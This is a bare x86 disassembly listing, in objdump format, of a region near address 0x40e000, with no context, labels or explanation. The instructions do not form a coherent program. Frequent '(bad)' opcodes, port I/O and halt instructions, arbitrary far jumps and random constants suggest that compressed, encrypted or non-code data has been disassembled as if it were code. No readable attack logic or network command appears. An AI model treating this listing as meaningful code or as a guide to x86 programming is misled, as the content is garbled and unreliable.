  40e04f:	jno    0x40e00d
  40e051:	sahf   
  40e052:	xor    bh,BYTE PTR [ebx+esi*1+0x43d1beb2]
  40e059:	cli    
  40e05a:	mov    edi,0x90c8b221
  40e05f:	cmp    DWORD PTR [edi+0x480050f4],edi
  40e065:	in     eax,0x5d
  40e067:	jmp    FWORD PTR [edi]
  40e069:	nop
  40e06a:	jle    0x40e0c3
  40e06c:	sbb    eax,0x7267edb5
  40e071:	add    bh,BYTE PTR [edx-0x37]
  40e074:	pop    edi
  40e075:	xor    eax,0xb765dcb4
  40e07a:	adc    al,0xa0
  40e07c:	adc    eax,0xbd5d8487
  40e081:	rcr    BYTE PTR [ebp+0x1a097a31],1
  40e087:	jmp    0x1872:0xf66da260
  40e08e:	aad    0x9e
  40e090:	xor    eax,0x3ad14fa8
  40e095:	imul   DWORD PTR [ecx-0x59d8145]
  40e09b:	add    edi,edi
  40e09d:	sar    DWORD PTR [eax+ebx*4-0x56],cl
  40e0a1:	add    BYTE PTR [eax-0x5d],bl
  40e0a4:	jge    0x40e0ba
  40e0a6:	retf   
  40e0a7:	imul   ebp,ebx,0xffffff9e
  40e0aa:	mov    ebp,0x5ad9f511
  40e0af:	xchg   ebx,eax
  40e0b0:	cli    
  40e0b1:	xor    BYTE PTR ds:0x14f70102,dl
  40e0b7:	push   es
  40e0b8:	or     al,0xbe
  40e0ba:	out    dx,eax
  40e0bb:	pusha  
  40e0bc:	or     eax,DWORD PTR [edx]
  40e0be:	ins    DWORD PTR es:[edi],dx
  40e0bf:	jl     0x40e050
  40e0c1:	out    0x49,al
  40e0c3:	dec    ebx
  40e0c4:	or     eax,0xfb845a7
  40e0c9:	retf   0x249e
  40e0cc:	jae    0x40e082
  40e0ce:	dec    ebx
  40e0cf:	mov    ebx,0x7fe7e050
  40e0d4:	mov    ch,0xcb
  40e0d6:	xor    ebx,DWORD PTR [ecx-0x6df97d00]
  40e0dc:	jbe    0x40e094
  40e0de:	jle    0x40e155
  40e0e0:	sahf   
  40e0e1:	and    ecx,DWORD PTR [eax]
  40e0e3:	xor    DWORD PTR [ebx+0x43],eax
  40e0e6:	outs   dx,DWORD PTR ds:[esi]
  40e0e7:	imul   edi,DWORD PTR [edi+eax*4+0x6b7acd87],0xffffffe6
  40e0ef:	aas    
  40e0f0:	sub    ah,al
  40e0f2:	addr16 mov ecx,0x84803f62
  40e0f8:	pop    eax
  40e0f9:	mov    ebp,0xf2004c12
  40e0fe:	fild   WORD PTR ss:[esi+0x14]
  40e102:	test   DWORD PTR [esi],ebx
  40e104:	or     ah,dl
  40e106:	stc    
  40e107:	jnp    0x40e13b
  40e109:	or     al,0xa1
  40e10b:	mov    dh,0x12
  40e10d:	cwde   
  40e10e:	push   ds
  40e10f:	in     eax,0x95
  40e111:	inc    esp
  40e112:	call   FWORD PTR [ecx+0x70]
  40e115:	sub    al,0xad
  40e117:	leave  
  40e118:	mov    edx,0x9d5f5319
  40e11d:	xor    BYTE PTR [edx],bh
  40e11f:	add    eax,0xc72b50e8
  40e124:	sbb    al,0x1b
  40e126:	pop    esi
  40e127:	adc    ebx,esp
  40e129:	mov    BYTE PTR [ebx],dl
  40e12b:	pusha  
  40e12c:	lock hlt 
  40e12e:	push   ss
  40e12f:	fst    DWORD PTR [esi]
  40e131:	adc    ebp,ebp
  40e133:	test   DWORD PTR [esi-0x4a795bd7],edi
  40e139:	jp     0x40e14a
  40e13b:	fisub  DWORD PTR [ebp+0x5a]
  40e13e:	daa    
  40e13f:	pop    edi
  40e140:	bnd ret 
  40e142:	fs ret 
  40e144:	cdq    
  40e145:	and    ebp,DWORD PTR [eax+0x1ea4ccfa]
  40e14b:	add    eax,0x81c02c4d
  40e150:	shl    DWORD PTR [esi],cl
  40e152:	cdq    
  40e153:	icebp  
  40e154:	fimul  DWORD PTR [esi-0x2f]
  40e157:	je     0x40e0fd
  40e159:	fidivr DWORD PTR [ebx+0x22ba79eb]
  40e15f:	call   0x5e600044
  40e164:	add    al,0x9a
  40e166:	xchg   DWORD PTR [edi-0x74],edi
  40e169:	add    ecx,DWORD PTR [esi+0x34]
  40e16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e16d:	sub    DWORD PTR [ebx+0x2d15c78f],eax
  40e173:	in     eax,0xb9
  40e175:	leave  
  40e176:	sbb    DWORD PTR [edx+0x4a],0x98eb62aa
  40e17d:	xor    edi,edx
  40e17f:	leave  
  40e180:	fldenv [eax-0x2c3cf639]
  40e186:	das    
  40e187:	adc    al,0x36
  40e189:	mov    cl,0x2a
  40e18b:	test   al,0x1b
  40e18d:	shr    esi,1
  40e18f:	in     eax,0xc1
  40e191:	inc    esp
  40e192:	cwde   
  40e193:	lahf   
  40e194:	cdq    
  40e195:	mov    edx,0x1b23e659
  40e19a:	push   ss
  40e19b:	and    esp,DWORD PTR [ebp+0x7c668e06]
  40e1a1:	jmp    0xdbf4:0xdea3
  40e1a7:	or     BYTE PTR [esi-0x3e],bh
  40e1aa:	xor    eax,0x87ae8660
  40e1af:	fiadd  WORD PTR [ebx+0x2d]
  40e1b2:	mov    al,0x26
  40e1b4:	rol    DWORD PTR [edx],cl
  40e1b6:	(bad)  
  40e1b7:	jp     0x40e194
  40e1b9:	inc    ebx
  40e1ba:	push   0x39
  40e1bc:	cmp    cl,dh
  40e1be:	and    al,0x7d
  40e1c0:	iret   
  40e1c1:	shl    DWORD PTR [eax-0x3da13b32],cl
  40e1c7:	xor    al,0xcd
  40e1c9:	push   ecx
  40e1ca:	push   esi
  40e1cb:	and    al,0x77
  40e1cd:	pop    ebp
  40e1ce:	xor    eax,0x3a3dfa2c
  40e1d3:	or     ecx,DWORD PTR es:[edi+edi*2-0x80]
  40e1d8:	mov    WORD PTR [eax-0x23],es
  40e1db:	push   0xfffffffc
  40e1dd:	mov    ch,0x36
  40e1df:	or     DWORD PTR [esi],ecx
  40e1e1:	mov    esi,0x4919e053
  40e1e6:	pusha  
  40e1e7:	stc    
  40e1e8:	lock push cs
  40e1ea:	or     al,0x48
  40e1ec:	pop    edi
  40e1ed:	jno    0x40e250
  40e1ef:	cmp    cl,dh
  40e1f1:	bound  ecx,QWORD PTR [edi-0x56d27fab]
  40e1f7:	les    edi,FWORD PTR [edx+0x60]
  40e1fa:	jp     0x40e217
  40e1fc:	xchg   ebx,eax
  40e1fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1fe:	and    BYTE PTR [eax+0x4921db01],ch
  40e204:	not    cl
  40e206:	retf   0xad19
  40e209:	retf   
  40e20a:	out    dx,eax
  40e20b:	sub    esp,ecx
  40e20d:	xchg   esp,eax
  40e20e:	and    eax,0xb6c0b9a3
  40e213:	retf   0x74b5
  40e216:	(bad)  
  40e217:	jmp    0x40e277
  40e219:	popf   
  40e21a:	iret   
  40e21b:	mov    ds:0x9b44f631,al
  40e220:	retf   0x559
  40e223:	jns    0x40e22d
  40e225:	popa   
  40e226:	pop    ebx
  40e227:	mov    ds:0x94819f5f,al
  40e22c:	test   al,0x73
  40e22e:	push   esp
  40e22f:	adc    edx,0xffffffb5
  40e232:	cwde   
  40e233:	sbb    al,0xf8
  40e236:	mov    dh,0x72
  40e238:	(bad)  
  40e239:	les    esp,FWORD PTR [ecx]
  40e23b:	lock aaa 
  40e23d:	(bad)  
  40e23e:	mov    ebx,DWORD PTR [edi]
  40e240:	inc    ebx
  40e241:	add    al,0x8e
  40e243:	cdq    
  40e244:	jle    0x40e1d2
  40e246:	add    eax,ebp
  40e248:	test   eax,0x346b5989
  40e24d:	pushf  
  40e24e:	mov    bh,0x5b
  40e250:	repz pop ecx
  40e252:	xchg   esi,eax
  40e253:	fisttp QWORD PTR [ecx-0x78306c15]
  40e259:	push   cs
  40e25a:	sub    al,0xa7
  40e25c:	ds jbe 0x40e2d1
  40e25f:	xchg   BYTE PTR [ebx],al
  40e261:	retf   0xfe4f
  40e264:	es jno 0x40e228
  40e267:	xchg   edx,eax
  40e268:	mov    ecx,0x5d471159
  40e26d:	cmp    DWORD PTR ds:0x32f1a14b,esi
  40e273:	or     DWORD PTR [edx-0x64c4d488],edi
  40e279:	lock xchg esp,eax
  40e27b:	sbb    al,0xb6
  40e27d:	sti    
  40e27e:	nop
  40e27f:	mov    bl,0xbe
  40e281:	sahf   
  40e282:	adc    al,0x5a
  40e284:	adc    DWORD PTR [edx+eax*1],0x5d
  40e288:	scas   al,BYTE PTR es:[edi]
  40e289:	out    0xd0,al
  40e28b:	xchg   BYTE PTR [ebx+eiz*2],ah
  40e28e:	(bad)  
  40e28f:	lahf   
  40e290:	and    eax,0x6f8478e3
  40e295:	test   al,0x9b
  40e297:	inc    ebp
  40e298:	cmp    eax,0x71c8c268
  40e29d:	in     eax,dx
  40e29e:	adc    al,BYTE PTR [ecx+0x77]
  40e2a1:	mov    esi,0xa5e9f6da
  40e2a6:	cmp    ch,ch
  40e2a8:	ror    BYTE PTR [ebx+0x5b],1
  40e2ab:	bound  ebp,QWORD PTR [edx-0x24f42497]
  40e2b1:	leave  
  40e2b2:	hlt    
  40e2b3:	or     ch,dh
  40e2b5:	test   esi,edi
  40e2b7:	inc    ecx
  40e2b8:	push   ss
  40e2b9:	xor    eax,0x4368a844
  40e2be:	add    edx,DWORD PTR [edx]
  40e2c0:	adc    ah,BYTE PTR [ebx-0x706d0c49]
  40e2c6:	out    0x1a,eax
  40e2c8:	xor    bl,ch
  40e2ca:	jl     0x40e348
  40e2cc:	jae    0x40e2a5
  40e2ce:	in     al,dx
  40e2cf:	fcom   DWORD PTR [ebx-0x44]
  40e2d2:	push   cs
  40e2d3:	adc    esp,DWORD PTR [esp+ebp*2-0x79280a9e]
  40e2da:	push   eax
  40e2db:	addr16 iret 
  40e2dd:	(bad)  
  40e2de:	cmp    BYTE PTR [ebx+edx*8-0x1928324b],dl
  40e2e5:	push   esi
  40e2e6:	inc    edi
  40e2e7:	or     eax,0xef81bca4
  40e2ec:	or     eax,0x2df1f836
  40e2f1:	leave  
  40e2f2:	xor    BYTE PTR ds:0x9a46323d,ch
  40e2f8:	push   eax
  40e2f9:	es push 0xc4b1d97d
  40e2ff:	aam    0x36
  40e301:	mov    al,0x28
  40e303:	lock call 0xa66c8512
  40e309:	and    edx,DWORD PTR [ecx+0x797f3daf]
  40e30f:	cld    
  40e310:	xlat   BYTE PTR ds:[ebx]
  40e311:	or     al,0xf4
  40e313:	sub    esp,DWORD PTR [esi-0x30]
  40e316:	mov    ebp,0x7cf88cb0
  40e31b:	mov    bl,0xcb
  40e31d:	daa    
  40e31e:	gs popa 
  40e320:	das    
  40e321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e322:	daa    
  40e323:	xlat   BYTE PTR ds:[ebx]
  40e324:	xchg   edi,eax
  40e325:	fsubr  st,st(7)
  40e327:	and    eax,0xc6adf1c
  40e32c:	push   esi
  40e32d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e32e:	and    cl,ah
  40e330:	add    DWORD PTR [ebp-0x4d],edi
  40e333:	repz fcomp QWORD PTR ds:0x597cbc98
  40e33a:	fld    DWORD PTR [edi+0x5c949b1e]
  40e340:	outs   dx,BYTE PTR ds:[esi]
  40e341:	mov    edi,0xaec0d4c6
  40e346:	retf   
  40e347:	push   cs
  40e348:	cmovle eax,DWORD PTR [ecx+0x45]
  40e34c:	jb     0x40e368
  40e34e:	daa    
  40e34f:	and    DWORD PTR [ecx-0x410947b1],ebx
  40e355:	xor    ebx,edi
  40e357:	fs icebp 
  40e359:	(bad)  
  40e35a:	cmp    eax,0x742d8aa5
  40e35f:	jo     0x40e36e
  40e361:	outs   dx,BYTE PTR ds:[esi]
  40e362:	stc    
  40e363:	or     edi,DWORD PTR [ebx]
  40e365:	mov    esp,0x1a7fda6d
  40e36a:	in     eax,0x1
  40e36c:	(bad)  
  40e36d:	pop    ds
  40e36e:	push   0xa
  40e370:	inc    ebx
  40e371:	inc    esp
  40e372:	lahf   
  40e373:	not    BYTE PTR [ebx-0x6aa08b65]
  40e379:	scas   eax,DWORD PTR es:[edi]
  40e37a:	pop    ebx
  40e37b:	mov    ch,0x97
  40e37d:	in     al,0x11
  40e37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e380:	imul   edi,DWORD PTR [esi+0x55],0xc
  40e384:	mov    eax,ds:0xf2f11d6c
  40e389:	xor    edi,DWORD PTR [eax-0x5f]
  40e38c:	rcr    edi,0xd6
  40e38f:	adc    BYTE PTR [edi],0xc0
  40e392:	mov    eax,0x6744407
  40e397:	ret    
  40e398:	outs   dx,BYTE PTR ds:[esi]
  40e399:	stc    
  40e39a:	add    ebx,DWORD PTR [edi-0x53]
  40e39d:	push   esi
  40e39e:	mov    ds:0xf3bde996,eax
  40e3a3:	push   eax
  40e3a4:	outs   dx,DWORD PTR ds:[esi]
  40e3a5:	sbb    al,BYTE PTR [eax-0x18]
  40e3a8:	inc    ebx
  40e3a9:	adc    BYTE PTR [esi-0x20adad10],bl
  40e3af:	mov    DWORD PTR ds:0x2fb0575f,ecx
  40e3b5:	jecxz  0x40e372
  40e3b7:	inc    ebp
  40e3b8:	inc    esi
  40e3b9:	pop    ss
  40e3ba:	add    BYTE PTR [eax],al
  40e3bc:	pop    esi
  40e3bd:	fcmovne st,st(3)
  40e3bf:	in     eax,0xc
  40e3c1:	rcl    bh,cl
  40e3c3:	(bad)  
  40e3c4:	cld    
  40e3c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3c6:	popf   
  40e3c7:	outs   dx,DWORD PTR ds:[esi]
  40e3c8:	mov    edx,0x5393d421
  40e3cd:	adc    dl,BYTE PTR [esp+edi*4-0x448c0616]
  40e3d4:	dec    eax
  40e3d5:	stos   BYTE PTR es:[edi],al
  40e3d6:	popf   
  40e3d7:	rcl    dl,1
  40e3d9:	push   ebp
  40e3da:	mov    ebx,ds
  40e3dc:	mov    dl,0x9d
  40e3de:	inc    eax
  40e3df:	cmp    al,0xaf
  40e3e1:	(bad)  
  40e3e2:	icebp  
  40e3e3:	and    BYTE PTR [ebp-0x2f226abc],ah
  40e3e9:	sub    al,0xe0
  40e3eb:	aaa    
  40e3ec:	jb     0x40e41d
  40e3ee:	push   ss
  40e3ef:	sub    eax,0xda626d4e
  40e3f4:	dec    edx
  40e3f5:	adc    BYTE PTR [ebx-0x70],0x28
  40e3f9:	or     DWORD PTR [esi+eiz*1],edx
  40e3fc:	or     ch,BYTE PTR [edi]
  40e3fe:	push   ebx
  40e3ff:	inc    edx
  40e400:	test   al,0x3d
  40e402:	test   al,0x65
  40e404:	jecxz  0x40e392
  40e406:	jo     0x40e3c7
  40e408:	xchg   ecx,eax
  40e409:	cdq    
  40e40a:	aam    0x86
  40e40c:	sbb    ah,ch
  40e40e:	add    ecx,edx
  40e410:	mov    DWORD PTR [edx+0x12],0x8e3e4efc
  40e417:	jp     0xe1a137de
  40e41d:	int    0x92
  40e41f:	iret   
  40e420:	push   esi
  40e421:	(bad)  
  40e422:	jl     0x40e3ae
  40e424:	das    
  40e425:	push   ebx
  40e426:	js     0x40e3b0
  40e428:	jg     0x40e456
  40e42a:	call   0xe4c04de8
  40e42f:	sub    al,0x31
  40e431:	mov    BYTE PTR [ecx-0x71],al
  40e434:	adc    BYTE PTR [ecx+0x4832d71e],dl
  40e43a:	xor    DWORD PTR [ebx],ebp
  40e43c:	jmp    0xb9da:0x470424d
  40e443:	mov    ds:0x1b0975b8,al
  40e448:	cwde   
  40e449:	adc    BYTE PTR [esi],dh
  40e44b:	xacquire xchg DWORD PTR [ebx],eax
  40e44e:	shl    dl,cl
  40e450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e451:	sbb    ch,BYTE PTR [edi+0x6]
  40e454:	call   0xef1d:0xe4f0d17b
  40e45b:	inc    edx
  40e45c:	fld    st(5)
  40e45e:	inc    eax
  40e45f:	fisttp WORD PTR gs:[esi]
  40e462:	lock ror DWORD PTR ds:0x626d11fd,0x2f
  40e46a:	cmp    BYTE PTR fs:[ebx+0x45f363c6],dl
  40e471:	push   es
  40e472:	xchg   BYTE PTR [eax],ah
  40e474:	nop
  40e475:	adc    al,0x3d
  40e477:	mov    eax,0xc9c01984
  40e47c:	add    eax,0xa3e15d8a
  40e481:	stc    
  40e482:	xchg   ebp,eax
  40e483:	push   esi
  40e484:	mov    edx,DWORD PTR [edi]
  40e486:	sbb    DWORD PTR [esi-0x35],edx
  40e489:	mov    ch,0xd8
  40e48b:	ds in  eax,0x82
  40e48e:	sar    BYTE PTR [edx+eax*2+0x9277ed4],cl
  40e495:	stos   BYTE PTR es:[edi],al
  40e496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e497:	or     BYTE PTR [ebx+0x2adf2827],al
  40e49d:	pop    es
  40e49e:	retf   
  40e49f:	lds    eax,FWORD PTR ds:0xdb80a2f0
  40e4a5:	loopne 0x40e524
  40e4a7:	xor    al,0x34
  40e4a9:	or     DWORD PTR [ecx],0xffffffe2
  40e4ac:	inc    esi
  40e4ad:	leave  
  40e4ae:	out    dx,eax
  40e4af:	cmp    ebx,esi
  40e4b1:	out    dx,eax
  40e4b2:	xchg   ebp,eax
  40e4b3:	or     DWORD PTR [edx],edi
  40e4b5:	or     ch,ah
  40e4b7:	or     DWORD PTR [edx+0x7413cc1c],edx
  40e4bd:	test   DWORD PTR ds:0x21e43a2,0x5d0dcb3b
  40e4c7:	dec    edi
  40e4c8:	mov    ecx,0x4b127bc2
  40e4cd:	pop    ds
  40e4ce:	sbb    ch,BYTE PTR [eax]
  40e4d0:	push   edx
  40e4d1:	pop    ds
  40e4d2:	pop    ecx
  40e4d3:	int3   
  40e4d4:	hlt    
  40e4d5:	loop   0x40e49e
  40e4d7:	or     BYTE PTR [edx-0x69b9c594],bl
  40e4dd:	pop    ss
  40e4de:	mov    cl,0xd0
  40e4e0:	xor    DWORD PTR [ecx+esi*2-0x34],0xffffffa0
  40e4e5:	add    dh,BYTE PTR ds:0x8b19984c
  40e4eb:	out    0x22,al
  40e4ed:	repz mov eax,ds:0x6e842f6d
  40e4f3:	jae    0x40e4b8
  40e4f5:	mov    ebp,0x21d95abd
  40e4fa:	push   esi
  40e4fb:	jl     0x40e4f2
  40e4fd:	inc    ebp
  40e4fe:	data16 jo 0x40e515
  40e501:	not    BYTE PTR cs:[di-0x5b]
  40e506:	dec    edx
  40e507:	mov    ebp,0x594996d3
  40e50c:	push   ebp
  40e50d:	push   es
  40e50e:	popf   
  40e50f:	pop    ebx
  40e510:	call   0x96a5cdb1
  40e515:	mov    ah,0x89
  40e517:	test   al,0xb5
  40e519:	push   ebx
  40e51a:	call   0x458a27a9
  40e51f:	int3   
  40e520:	int3   
  40e521:	ret    0xbb2f
  40e524:	or     dl,BYTE PTR [ebx-0x6ff89b92]
  40e52a:	mov    esp,0xb8148d65
  40e52f:	adc    eax,0x246ff78e
  40e534:	adc    eax,0x54b9ad7b
  40e539:	jo     0x40e53c
  40e53b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e53c:	pop    es
  40e53d:	idiv   BYTE PTR [ecx-0x4f]
  40e540:	jno    0x40e5bc
  40e542:	stc    
  40e543:	jmp    0x34a81687
  40e548:	sbb    DWORD PTR [ecx+ebx*8+0x3ed20bfd],edi
  40e54f:	add    al,0xb7
  40e551:	out    0x68,al
  40e553:	in     eax,dx
  40e554:	adc    al,0x33
  40e556:	les    eax,FWORD PTR [edi-0x75]
  40e559:	or     eax,0xc2c098db
  40e55e:	inc    edi
  40e55f:	push   ebx
  40e560:	mov    eax,0x680962e7
  40e565:	dec    edi
  40e566:	ins    DWORD PTR es:[edi],dx
  40e567:	adc    eax,0x812bb8e0
  40e56c:	pop    ecx
  40e56d:	das    
  40e56e:	jnp    0x40e4ff
  40e570:	sbb    DWORD PTR [ebx+0x6b99da],ebx
  40e576:	(bad)  
  40e577:	stc    
  40e578:	(bad)  
  40e579:	outs   dx,BYTE PTR ds:[esi]
  40e57a:	sub    BYTE PTR [edi-0x79],al
  40e57d:	or     DWORD PTR [esi-0x7f],esp
  40e580:	addr16 push es
  40e582:	sbb    eax,DWORD PTR [edi-0x42]
  40e585:	cmp    al,0xa
  40e587:	and    edi,edi
  40e589:	sub    eax,0xa527db12
  40e58e:	dec    edi
  40e58f:	lock aad 0x49
  40e592:	inc    esi
  40e593:	dec    edx
  40e594:	add    al,0xfa
  40e596:	(bad)  
  40e597:	sbb    al,0x39
  40e599:	sbb    esp,0xffffffe0
  40e59c:	es jge 0x40e5fc
  40e59f:	lods   eax,DWORD PTR ds:[esi]
  40e5a0:	fst    DWORD PTR [ebp-0x4db671f]
  40e5a6:	pop    ecx
  40e5a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5a8:	test   ebp,edi
  40e5aa:	push   ecx
  40e5ab:	test   eax,0x6478287e
  40e5b0:	cmp    bl,BYTE PTR [edi]
  40e5b2:	xchg   ecx,eax
  40e5b3:	inc    esi
  40e5b4:	fnstcw WORD PTR [esi]
  40e5b6:	pop    ebp
  40e5b7:	dec    ebx
  40e5b8:	sbb    eax,DWORD PTR [ecx]
  40e5ba:	sub    ah,BYTE PTR [ebp-0x23]
  40e5bd:	les    ecx,FWORD PTR ds:0x4b56ba4d
  40e5c3:	push   DWORD PTR [ebp+0x0]
  40e5c6:	xor    BYTE PTR [eax+0x27ce8a22],0x1c
  40e5cd:	mov    ds:0x1f7a53cf,eax
  40e5d2:	mov    ebp,0x1fc9ec6a
  40e5d7:	xchg   ecx,eax
  40e5d8:	dec    ecx
  40e5d9:	jge    0x40e5fd
  40e5db:	repz das 
  40e5dd:	jmp    0x1bb872c0
  40e5e2:	lea    edi,[ecx]
  40e5e4:	sar    BYTE PTR [ebp+0x2bbd103],1
  40e5ea:	retf   
  40e5eb:	loope  0x40e56f
  40e5ed:	gs push es
  40e5ef:	popa   
  40e5f0:	adc    ecx,DWORD PTR [ebx+0x26dd8e46]
  40e5f6:	in     eax,0xb
  40e5f8:	jne    0x40e629
  40e5fa:	ins    BYTE PTR es:[edi],dx
  40e5fb:	mov    bh,0xc8
  40e5fd:	mov    eax,ds:0xc48b774d
  40e602:	add    al,0xb6
  40e604:	cld    
  40e605:	jae    0x40e65f
  40e607:	cmp    cl,dh
  40e609:	sub    al,0xa
  40e60b:	sbb    DWORD PTR [esi],esp
  40e60d:	fld    DWORD PTR [esi+0x5c79d5a7]
  40e613:	inc    esp
  40e614:	adc    BYTE PTR [ecx-0x54f208ca],bh
  40e61a:	mov    dl,0xa9
  40e61c:	call   ebx
  40e61e:	mov    ds:0x5f3b7ce4,eax
  40e623:	xor    eax,0x9f5cb5f0
  40e628:	jno    0x40e5fc
  40e62a:	mov    ah,0x51
  40e62c:	cmp    al,0x23
  40e62e:	sbb    BYTE PTR [ebx-0x736bc8a7],ch
  40e634:	ret    
  40e635:	in     eax,0xc6
  40e637:	jle    0x40e67f
  40e639:	or     dl,BYTE PTR [esi+0x33]
  40e63c:	sub    bl,al
  40e63e:	dec    esi
  40e63f:	xchg   ebx,eax
  40e640:	lock push ss
  40e642:	sbb    BYTE PTR [edx-0x4368a91e],dh
  40e648:	ror    BYTE PTR [edi+eiz*4+0x8],cl
  40e64c:	jmp    0x3b68:0x808f2911
  40e653:	outs   dx,DWORD PTR ds:[esi]
  40e654:	xor    ecx,DWORD PTR [ecx-0x2f2686a8]
  40e65a:	icebp  
  40e65b:	mov    ?,WORD PTR [edi+0x1ffbcf97]
  40e661:	call   0x4942bb36
  40e666:	fstp   QWORD PTR [ebp+0x53b70206]
  40e66c:	dec    ebp
  40e66d:	push   es
  40e66e:	inc    ebp
  40e66f:	push   cs
  40e670:	addr16 jae 0x40e6da
  40e673:	fwait
  40e674:	test   eax,0xff1d8df8
  40e679:	mov    al,ds:0x83e73058
  40e67e:	enter  0xbaec,0xe7
  40e682:	js     0x40e63e
  40e684:	popaw  
  40e686:	dec    esi
  40e687:	mov    esi,DWORD PTR [ebx+ecx*2-0x26]
  40e68b:	ja     0x40e672
  40e68d:	mov    dh,0x5c
  40e68f:	ins    DWORD PTR es:[edi],dx
  40e690:	xchg   esp,eax
  40e691:	mul    BYTE PTR [eax]
  40e693:	mov    ebx,0x255f93b6
  40e698:	cmp    bl,BYTE PTR [edx]
  40e69a:	xor    DWORD PTR [ebp-0x21],esi
  40e69d:	pop    eax
  40e69e:	push   ds
  40e69f:	jg     0x40e650
  40e6a1:	jmp    0x677d:0xd4b09fc9
  40e6a8:	lds    esp,FWORD PTR [ebx-0x310faf58]
  40e6ae:	jo     0x40e6f2
  40e6b0:	pop    eax
  40e6b1:	sbb    BYTE PTR [ecx],bl
  40e6b3:	and    esi,DWORD PTR [ebx-0x70]
  40e6b6:	ins    DWORD PTR es:[edi],dx
  40e6b7:	xchg   dl,al
  40e6b9:	jmp    0x5c14:0xaf6fddb8
  40e6c0:	push   ds
  40e6c1:	push   eax
  40e6c2:	fmul   DWORD PTR [ecx-0x10]
  40e6c5:	aam    0x32
  40e6c7:	rcl    DWORD PTR ds:0x4717a9f6,1
  40e6cd:	mov    esp,0xd4fd99ac
  40e6d2:	aam    0x63
  40e6d4:	mov    edi,?
  40e6d6:	jmp    0x40e65c
  40e6d8:	loope  0x40e68d
  40e6da:	fstp   QWORD PTR [ebx-0x54c1761f]
  40e6e0:	add    ebp,DWORD PTR [edi+ebx*8+0x5c]
  40e6e4:	mov    esi,0xc5bf5db9
  40e6e9:	jg     0x40e6c6
  40e6eb:	sub    DWORD PTR [ecx-0x6ece9232],ebp
  40e6f1:	adc    ah,BYTE PTR [edi+ecx*1+0x3e]
  40e6f5:	push   ds
  40e6f6:	push   edi
  40e6f7:	or     edi,DWORD PTR [eax]
  40e6f9:	sbb    ecx,DWORD PTR ds:0xaa0413aa
  40e6ff:	sahf   
  40e700:	jp     0x40e739
  40e702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e703:	(bad)  
  40e704:	cli    
  40e705:	push   es
  40e706:	addr16 dec ebp
  40e708:	mov    dh,0xcf
  40e70a:	int3   
  40e70b:	je     0x40e712
  40e70d:	lods   al,BYTE PTR ds:[esi]
  40e70e:	jp     0x40e726
  40e710:	cli    
  40e711:	neg    DWORD PTR [edx+0x2c]
  40e714:	enter  0x28bd,0xe6
  40e718:	arpl   WORD PTR [edi],cx
  40e71a:	iret   
  40e71b:	fcomp  QWORD PTR [esi]
  40e71d:	adc    eax,DWORD PTR [edi+0x5feb7d0e]
  40e723:	or     BYTE PTR [esi+0x75],cl
  40e726:	dec    eax
  40e727:	or     esp,DWORD PTR [eax]
  40e729:	ret    0x438f
  40e72c:	bound  ecx,QWORD PTR ds:0x9504ce74
  40e732:	(bad)  
  40e733:	sbb    dh,BYTE PTR [edi]
  40e735:	pop    edx
  40e736:	xor    ecx,DWORD PTR [ecx-0x69]
  40e739:	and    dh,BYTE PTR [ebx+edi*1]
  40e73c:	loope  0x40e6bf
  40e73e:	xlat   BYTE PTR ds:[ebx]
  40e73f:	js     0x40e76e
  40e741:	dec    esi
  40e742:	cmc    
  40e743:	sbb    esi,ebp
  40e745:	test   eax,0xd215bdde
  40e74a:	cmp    eax,DWORD PTR [eax-0x58]
  40e74d:	inc    edx
  40e74e:	sbb    al,0xee
  40e750:	adc    al,0xbb
  40e752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e753:	and    ebp,ecx
  40e755:	mov    eax,ds:0x9dee9ec9
  40e75a:	mov    BYTE PTR [esi-0x1562c70d],ah
  40e760:	or     cl,BYTE PTR [edx]
  40e762:	jb     0x40e72f
  40e764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e765:	imul   ecx,DWORD PTR [ecx],0xf071b06a
  40e76b:	loop   0x40e7b4
  40e76d:	jmp    esp
  40e76f:	mul    DWORD PTR [ecx-0x10]
  40e772:	(bad)  
  40e774:	pop    ebp
  40e775:	jge    0x40e73e
  40e777:	push   ss
  40e778:	out    dx,al
  40e779:	es pusha 
  40e77b:	je     0x40e78c
  40e77d:	jmp    0xb1215408
  40e782:	loop   0x40e7d8
  40e784:	popf   
  40e785:	stos   BYTE PTR es:[edi],al
  40e786:	iret   
  40e787:	loope  0x40e7dd
  40e789:	xchg   edi,eax
  40e78a:	popf   
  40e78b:	aam    0xa7
  40e78d:	into   
  40e78e:	xchg   ebp,eax
  40e78f:	ret    0xfaff
  40e792:	jnp    0x40e7cc
  40e794:	pop    ss
  40e795:	test   eax,0x8f26a7e0
  40e79a:	jge    0x40e7a9
  40e79c:	xchg   ecx,eax
  40e79d:	add    ah,ch
  40e79f:	jmp    0x3c37:0x735ddb1e
  40e7a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7a7:	and    ah,BYTE PTR [esi]
  40e7a9:	push   0xfc6fe217
  40e7ae:	adc    ch,cl
  40e7b0:	jbe    0x40e7ba
  40e7b2:	pop    eax
  40e7b3:	(bad)  
  40e7b4:	mov    ch,0xfa
  40e7b6:	adc    DWORD PTR [edi-0x70],ebx
  40e7b9:	out    dx,eax
  40e7ba:	rol    DWORD PTR [edx+0x2fc4af46],cl
  40e7c0:	mov    ch,0x37
  40e7c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7c3:	es loope 0x40e772
  40e7c6:	mov    eax,0x2e958e0a
  40e7cb:	rcr    BYTE PTR ds:0x38de507a,0x24
  40e7d2:	xchg   esp,eax
  40e7d3:	pushf  
  40e7d4:	in     al,0xf2
  40e7d6:	and    bl,ah
  40e7d8:	fiadd  DWORD PTR [esi+esi*1+0x65]
  40e7dc:	in     eax,dx
  40e7dd:	pop    ebp
  40e7de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
